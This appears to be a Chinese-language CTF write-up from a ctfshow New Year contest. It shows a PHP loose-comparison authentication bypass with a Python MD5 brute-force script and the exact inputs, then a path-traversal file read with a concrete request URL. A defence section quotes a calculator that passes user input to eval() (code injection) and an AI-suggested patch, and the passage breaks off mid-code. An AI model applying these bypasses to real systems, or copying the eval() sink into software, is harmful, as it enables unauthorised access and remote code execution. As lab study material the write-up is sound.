<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$accessKey</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;access_key&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$channelKey</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;channel_key&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$expected</span> = <span class="title function_ invoke__">getExpectedHash</span>(<span class="variable">$channelKey</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$accessKey</span>) == <span class="variable">$expected</span>) &#123; <span class="comment">// 关键点：弱类型比较 ==</span></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;authed&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里使用了 <code>==</code> 进行比较。在 PHP 中，如果一个字符串和一个整数进行比较，字符串会被尝试转换为数字。如果 <code>md5($accessKey)</code> 计算出的哈希值字符串以数字开头，PHP 会提取开头的数字部分与 <code>$expected</code> 进行比较。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getExpectedHash</span>(<span class="params"><span class="variable">$channelKey</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">buildExpectedHash</span>(<span class="variable">$channelKey</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">Throwable</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">pickErrorCode</span>(<span class="variable">$e</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buildExpectedHash</span>(<span class="params"><span class="variable">$channelKey</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">// 如果长度小于 64，正常生成 hash</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00-\x08\x0B\x0C\x0E-\x1F]/&#x27;</span>, <span class="variable">$channelKey</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$channelKey</span>) &lt; <span class="number">64</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;ctfshow:&#x27;</span> . <span class="variable">$channelKey</span> . <span class="string">&#x27;:verify&#x27;</span> . <span class="variable">$secret_salt</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// 如果长度 &gt;= 64，抛出 LENGTH_ERROR</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;&#x27;</span>, LENGTH_ERROR);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(<span class="built_in">Throwable</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">        <span class="comment">// 捕获异常（包括上面的 LENGTH_ERROR），重新抛出 VERIFY_FAILED</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RuntimeException</span>(<span class="string">&#x27;&#x27;</span>, VERIFY_FAILED);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>关键逻辑链：</strong></p>
<ol>
<li>如果我们传入的 <code>channel_key</code> 长度 <strong>大于等于 64</strong>，<code>buildExpectedHash</code> 会进入 <code>else</code> 分支，抛出 <code>LENGTH_ERROR</code>。</li>
<li>该异常立即被同一个函数内的 <code>catch</code> 块捕获。</li>
<li><code>catch</code> 块抛出一个新的异常，错误码为 <code>VERIFY_FAILED</code>。</li>
<li>根据 [index.php:13](file:///a:/traeworkingplace/index.php#L13)，<code>const VERIFY_FAILED = 2025;</code>。</li>
</ol>
<p>接着，异常回到 <code>getExpectedHash</code> 的 <code>catch</code> 块，调用 <code>pickErrorCode</code>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pickErrorCode</span>(<span class="params"><span class="built_in">Throwable</span> <span class="variable">$e</span></span>): <span class="title">int</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$code</span> = (<span class="keyword">int</span>)<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getCode</span>(); <span class="comment">// 获取到 2025</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">inErrorCodes</span>(<span class="variable">$code</span>)) &#123;  <span class="comment">// 2025 在 ERROR_CODES 列表中</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$code</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>结论：</strong><br>
只要 <code>channel_key</code> 的长度超过 64 个字符，<code>getExpectedHash($channelKey)</code> 就会返回整数 <strong><code>2025</code></strong>。</p>
<h2 id="3-漏洞利用-Exploit"><a class="header-anchor" href="#3-漏洞利用-Exploit">¶</a>3. 漏洞利用 (Exploit)</h2>
<p>此时验证逻辑变为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$accessKey</span>) == <span class="number">2025</span>) &#123; ... &#125;</span><br></pre></td></tr></table></figure>
<p>因此，我们需要爆破一个字符串，其 MD5 值满足正则 <code>^2025[a-f]...</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_md5_hash</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;计算字符串的MD5哈希值&quot;&quot;&quot;</span></span><br><span class="line">    md5_hash = hashlib.md5()</span><br><span class="line">    md5_hash.update(text.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> md5_hash.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_pattern</span>(<span class="params">md5_hash</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;检查MD5值是否符合模式：2025开头，后面一位是字母&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(md5_hash) &lt; <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 检查是否以&quot;2025&quot;开头</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> md5_hash.startswith(<span class="string">&#x27;2025&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 检查第5位是否是字母（a-z或A-Z）</span></span><br><span class="line">    fifth_char = md5_hash[<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">return</span> fifth_char.isalpha()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_and_check</span>(<span class="params">length=<span class="number">1</span>, charset=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;生成指定长度的字符串并检查其MD5值&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> charset <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        charset = string.ascii_letters + string.digits</span><br><span class="line">    </span><br><span class="line">    found_count = <span class="number">0</span></span><br><span class="line">    total_checked = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;开始检查长度为 <span class="subst">&#123;length&#125;</span> 的字符串...&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    start_time = time.time()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 生成所有可能的组合</span></span><br><span class="line">    <span class="keyword">for</span> combo <span class="keyword">in</span> itertools.product(charset, repeat=length):</span><br><span class="line">        text = <span class="string">&#x27;&#x27;</span>.join(combo)</span><br><span class="line">        md5_hash = get_md5_hash(text)</span><br><span class="line">        total_checked += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> check_pattern(md5_hash):</span><br><span class="line">            found_count += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n🎯 找到匹配的值！&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;原文: <span class="subst">&#123;text&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;MD5: <span class="subst">&#123;md5_hash&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;位置: 第<span class="subst">&#123;total_checked&#125;</span>个尝试&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;用时: <span class="subst">&#123;time.time() - start_time:<span class="number">.2</span>f&#125;</span>秒&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span>, text, md5_hash</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 每10000次检查显示一次进度</span></span><br><span class="line">        <span class="keyword">if</span> total_checked % <span class="number">10000</span> == <span class="number">0</span>:</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;已检查: <span class="subst">&#123;total_checked&#125;</span>, 找到: <span class="subst">&#123;found_count&#125;</span>, 用时: <span class="subst">&#123;elapsed_time:<span class="number">.2</span>f&#125;</span>秒&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;🔍 MD5值搜索工具&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;搜索模式: MD5值以&#x27;2025&#x27;开头，第5位是字母&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">50</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 定义字符集 - 先尝试简单的情况</span></span><br><span class="line">    charsets = [</span><br><span class="line">        string.digits,  <span class="comment"># 先尝试数字</span></span><br><span class="line">        string.ascii_lowercase,  <span class="comment"># 再尝试小写字母</span></span><br><span class="line">        string.ascii_uppercase,  <span class="comment"># 然后大写字母</span></span><br><span class="line">        string.ascii_letters + string.digits,  <span class="comment"># 最后字母+数字</span></span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    charset_names = [<span class="string">&quot;数字&quot;</span>, <span class="string">&quot;小写字母&quot;</span>, <span class="string">&quot;大写字母&quot;</span>, <span class="string">&quot;字母+数字&quot;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> charset, name <span class="keyword">in</span> <span class="built_in">zip</span>(charsets, charset_names):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n📋 正在尝试字符集: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 尝试不同长度的字符串</span></span><br><span class="line">        <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5</span>):  <span class="comment"># 从长度1到4</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;尝试长度 <span class="subst">&#123;length&#125;</span>...&quot;</span>)</span><br><span class="line">            found, text, md5_hash = generate_and_check(length, charset)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> found:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\n✅ 成功找到匹配值！&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;📝 原文: <span class="subst">&#123;text&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;🔐 MD5: <span class="subst">&#123;md5_hash&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n❌ 在尝试的范围内未找到匹配值&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;💡 建议: 可以尝试更长的字符串或包含特殊字符&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026_image-1.png" alt="alt text"></p>
<p>访问密钥nhll<br>
保留码长度超过 64 位的字符，用于触发后端的长度异常：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure>
<ul>
<li>保留码 输入超长字符串，迫使服务器抛出异常并返回固定的错误码 2025 。</li>
<li>访问密钥 输入 434048 ，其 MD5 值以 2025 开头，利用 PHP 的弱类型比较（ == ）使验证成功。</li>
</ul>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026_image.png" alt="alt text"></p>
<p>ctfshow{9e20d8bc-58b4-4957-b204-d31db1ace052}</p>
<h1>AWDP攻击题目</h1>
<ul>
<li>暂时只看我比赛尝试过的</li>
</ul>
<h2 id="SafeViewer"><a class="header-anchor" href="#SafeViewer">¶</a>SafeViewer</h2>
<p>分类：AWDP攻击题目 | 分值：100</p>
<p>题目描述<br>
SafeViewer SafeRender SafeAdmin 共同使用本题的环境</p>
<p>这3个题目的flag前面 都会有明显的说明 是哪个题目的flag</p>
<p>环境变量中flag是占位，和题目无关</p>
<p><strong>原理：</strong><br>
利用了后端服务 <code>render</code> 存在的 <strong>Directory Traversal (目录遍历)</strong> 漏洞。<br>
漏洞点位于 <code>app.py</code> 的 <code>_safe_join</code> 函数，它没有正确过滤路径中的 <code>../</code>，导致攻击者可以访问服务器上的任意文件。</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026_image-8.png" alt="alt text"><br>
*   该接口对应后端 <code>app.py</code> 中的 <code>internal_file</code> 函数。</p>
<ol>
<li><strong>构造 Payload</strong>
<ul>
<li>我们想要读取后端源代码 <code>/app/app.py</code>。</li>
<li>正常请求：<code>path=/app</code> (如果允许) 或 <code>path=templates</code>。</li>
<li>恶意请求：利用 <code>../</code> 跳转到根目录，再访问 <code>/app/app.py</code>。</li>
<li>URL: <code>https://&lt;URL&gt;/api/v1/artifacts?path=/app&amp;filename=app.py</code></li>
<li>注意：这里其实直接使用了绝对路径 <code>/app</code>，因为 <code>_safe_join</code> 只是简单拼接，如果 <code>path</code> 以 <code>/</code> 开头</li>
</ul>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://566f348e-d5f6-4f91-b986-2992c57abbcc.challenge.ctf.show/api/v1/artifacts?path=/app&amp;filename=app.py</span><br></pre></td></tr></table></figure>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026_image-7.png" alt="alt text"></p>
<h1>SafeCar</h1>
<p>分类：AWDP攻击题目 | 分值：300</p>
<p>题目描述<br>
追踪JCenter，送他回老家。</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026_image-9.png" alt="alt text"><br>
<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026_image-10.png" alt="alt text"></p>
<ul>
<li>没做出来</li>
</ul>
<h1>AWDP防御题目</h1>
<ul>
<li>AWDP防御题目代码实力不够比赛全ai的就只看看思路了（好歹会给ai多点提示词bushi</li>
<li>我勒个就一个看得懂，后面基础上来了再学吧呜呜呜</li>
</ul>
<h2 id="SafeCalc"><a class="header-anchor" href="#SafeCalc">¶</a>SafeCalc</h2>
<ul>
<li>代码审计</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/json; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="comment"># HTTP响应头，明确数据格式application/json，UTF-8编码</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$expr</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;expr&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment"># 默认将其值设置为空字符串&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_string</span>(<span class="variable">$expr</span>)) <span class="title function_ invoke__">fail</span>(<span class="string">&#x27;bad request&#x27;</span>);</span><br><span class="line"><span class="comment"># 检查 $expr 是否是一个字符串，否，fail()返回错误信息 &#x27;bad request&#x27;</span></span><br><span class="line"><span class="variable">$expr</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$expr</span>);</span><br><span class="line"><span class="comment"># 去除$expr两端空白字符</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$expr</span> === <span class="string">&#x27;&#x27;</span>) <span class="title function_ invoke__">fail</span>(<span class="string">&#x27;empty&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$expr</span>) &gt; <span class="number">100</span>) <span class="title function_ invoke__">fail</span>(<span class="string">&#x27;too long&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$out</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;\$out=(<span class="subst">$expr</span>);&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;ok&#x27;</span> =&gt; <span class="literal">true</span>, <span class="string">&#x27;result&#x27;</span> =&gt; <span class="variable">$out</span>], JSON_UNESCAPED_UNICODE);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fail</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$msg</span>, <span class="keyword">int</span> <span class="variable">$code</span> = <span class="number">400</span></span>): <span class="title">void</span> </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="variable">$code</span>);</span><br><span class="line">    <span class="comment"># 设置 HTTP 响应码</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;ok&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;error&#x27;</span> =&gt; <span class="variable">$msg</span>], JSON_UNESCAPED_UNICODE);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>关键改动点：</p>
<ul>
<li><code>eval(&quot;\$out=($expr);&quot;);</code> → <code>safe_calc($expr)</code></li>
<li><code>safe_calc()</code>：字符白名单过滤 + 词法分析 + RPN 求值</li>
<li>错误统一走 <code>fail()</code> 输出 JSON，保证前端交互不崩</li>
</ul>
</blockquote>
<ul>
<li>ai解法分析：</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">declare</span>(strict_types=<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/json; charset=utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * SafeCalc Patch</span></span><br><span class="line"><span class="comment"> * - Removes eval() RCE</span></span><br><span class="line"><span class="comment"> * - Implements a tiny arithmetic expression parser:</span></span><br><span class="line"><span class="comment"> *   numbers (int/float), parentheses, + - * / %</span></span><br><span class="line"><span class="comment"> *   supports unary +/-</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fail</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$msg</span>, <span class="keyword">int</span> <span class="variable">$code</span> = <span class="number">400</span></span>): <span class="title">void</span> </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="variable">$code</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;ok&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;error&#x27;</span> =&gt; <span class="variable">$msg</span>], JSON_UNESCAPED_UNICODE);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$expr</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;expr&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_string</span>(<span class="variable">$expr</span>)) <span class="title function_ invoke__">fail</span>(<span class="string">&#x27;bad request&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$expr</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$expr</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$expr</span> === <span class="string">&#x27;&#x27;</span>) <span class="title function_ invoke__">fail</span>(<span class="string">&#x27;empty&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$expr</span>) &gt; <span class="number">100</span>) <span class="title function_ invoke__">fail</span>(<span class="string">&#x27;too long&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Allow only calculator characters (server-side). */</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[0-9+\-*/%().\s]+$/&#x27;</span>, <span class="variable">$expr</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">fail</span>(<span class="string">&#x27;invalid characters&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 正则表达式检查表达式</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$tokens</span> = <span class="title function_ invoke__">tokenize</span>(<span class="variable">$expr</span>);<span class="comment"># 将输入的表达式分解成一个个“token”</span></span><br><span class="line">    <span class="variable">$rpn</span>    = <span class="title function_ invoke__">to_rpn</span>(<span class="variable">$tokens</span>);<span class="comment"># 将 token 转换成逆波兰表示法（RPN）</span></span><br><span class="line">    <span class="variable">$value</span>  = <span class="title function_ invoke__">eval_rpn</span>(<span class="variable">$rpn</span>);<span class="comment"># 计算 RPN 表达式的值</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Normalize output a bit (avoid &quot;-0&quot;)</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_float</span>(<span class="variable">$value</span>) &amp;&amp; <span class="title function_ invoke__">abs</span>(<span class="variable">$value</span>) &lt; <span class="number">1e-12</span>) <span class="variable">$value</span> = <span class="number">0.0</span>;</span><br><span class="line"><span class="comment"># 如果结果是浮点数且接近零，设置为 0.0</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;ok&#x27;</span> =&gt; <span class="literal">true</span>, <span class="string">&#x27;result&#x27;</span> =&gt; <span class="variable">$value</span>], JSON_UNESCAPED_UNICODE);</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Throwable</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="comment">// Do not leak stack traces</span></span><br><span class="line">    <span class="title function_ invoke__">fail</span>(<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>(), <span class="number">400</span>);<span class="comment"># 返回计算结果，如果过程中发生任何异常，捕获异常并返回错误消息</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Tokenize expression into numbers and operators.</span></span><br><span class="line"><span class="comment"> * Returns array of tokens: float numbers, or strings: &#x27;+&#x27;,&#x27;-&#x27;,&#x27;*&#x27;,&#x27;/&#x27;,&#x27;%&#x27;,&#x27;(&#x27;,&#x27;)&#x27;,&#x27;u-&#x27;,&#x27;u+&#x27;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tokenize</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$s</span></span>): <span class="title">array</span> </span>&#123;</span><br><span class="line">    <span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>);</span><br><span class="line">    <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$tokens</span> = [];</span><br><span class="line">    <span class="variable">$prevType</span> = <span class="string">&#x27;start&#x27;</span>; <span class="comment">// start | num | op | lparen | rparen</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$i</span> &lt; <span class="variable">$len</span>) &#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="variable">$s</span>[<span class="variable">$i</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">ctype_space</span>(<span class="variable">$ch</span>)) &#123;</span><br><span class="line">            <span class="variable">$i</span>++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Number: digits and at most one dot</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$ch</span>) || <span class="variable">$ch</span> === <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable">$start</span> = <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$dot</span> = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (<span class="variable">$i</span> &lt; <span class="variable">$len</span>) &#123;</span><br><span class="line">                <span class="variable">$c</span> = <span class="variable">$s</span>[<span class="variable">$i</span>];</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$c</span>)) &#123;</span><br><span class="line">                    <span class="variable">$i</span>++;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$c</span> === <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">                    <span class="variable">$dot</span>++;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$dot</span> &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;bad number&#x27;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$i</span>++;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$numStr</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$s</span>, <span class="variable">$start</span>, <span class="variable">$i</span> - <span class="variable">$start</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$numStr</span> === <span class="string">&#x27;.&#x27;</span> || <span class="variable">$numStr</span> === <span class="string">&#x27;+.&#x27;</span> || <span class="variable">$numStr</span> === <span class="string">&#x27;-.&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span 